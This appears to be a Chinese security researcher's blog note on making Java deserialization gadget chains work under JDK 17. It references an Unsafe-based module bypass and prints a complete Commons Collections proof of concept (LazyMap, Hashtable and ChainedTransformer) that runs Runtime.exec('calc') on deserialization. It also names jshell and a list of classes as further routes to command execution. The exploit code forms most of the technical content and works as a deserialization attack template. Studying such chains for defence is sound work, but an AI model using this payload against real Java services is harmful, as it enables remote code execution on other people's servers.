# BypassJDK17 TemplatesImpl链子

当在JDK17中运行Templates的利用链时，会发现报错异常。（心心师傅有天突然跟我说jdk17没法加载啊感兴趣可以研看看）
![image-20230103211557071](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202301032115263.png)

然后找到了这个文章：https://github.com/BeichenDream/Kcon2021Code/blob/master/bypassJdk/JdkSecurityBypass.java

学到了几点：利用unsafe去修改module，即可实现绕过模板。=.=（原理不懂）
而且有意思的是   Class.class中的方法可以通过任何一个类进行反射.....应该是第一次见。=.=（原理不懂）

想了想：我怎么能用cc+jdk17里面打通呢？
我认为：只需要将不能突破的类全部写出来进行突破就行，先是Templates利用链，`没考虑到一个问题是有抽象类`。但是后来在心心解释说到：对方服务器怎么去执行unsafe修改呢？chaintransfrom是一个链式调用怎么单独调用unsafe呢？

所以理论上写是不行的。

当然也不需要绕过....如下poc

```java
        Transformer[] fakeTransformer = new Transformer[]{};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
        lazyMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, "test");
        hashtable.put(lazyMap2, "test");
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        lazyMap2.remove("yy");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashtable);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
```

同时另外一个思路打开了，在jdk17下我们可以寻找到所有能够访问的类进行构造poc。

如果Runtime.class不能访问，我们就可以尝试其他的，找到了jshell。这相当于也是一种思路，这篇文章总结了一些常用的命令执行、代码执行的类（https://moonsec.top/articles/124）

那么什么poc会用到绕过jdk17moudle并且是个成功的链子呢？相信以后会碰到。